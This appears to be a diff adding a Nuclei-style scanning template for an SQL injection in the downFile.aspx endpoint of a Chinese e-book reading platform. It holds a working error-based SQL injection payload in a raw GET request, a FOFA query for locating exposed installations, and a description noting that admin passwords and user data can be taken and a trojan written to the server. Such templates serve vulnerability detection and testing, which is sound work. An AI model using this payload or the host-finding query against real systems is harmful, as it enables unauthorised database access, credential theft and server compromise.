@@ -1,0 +1,26 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - qzqzq1qkxzq
+        - status:
+            - 500
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /web/downFile.aspx?id=%27%2B%28SELECT+CHAR%2867%29%2BCHAR%2885%29%2BCHAR%2886%29%2BCHAR%2879%29+WHERE+1651%3D1651+AND+7828+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%287828%3D7828%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29%29%2B%27 HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+id: dianzitushu-downFile_aspx-sql
+info:
+    author: Superhero
+    description: |-
+        fofa: body="/Index.aspx/SearchBy"
+        电子图书阅读平台 downFile.aspx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+    name: 电子图书阅读平台 downFile.aspx SQL注入漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/C3NxCqnVvHM61--Omap6Gg?token=1543860814&lang=zh_CN
+    severity: high
+    tags: []
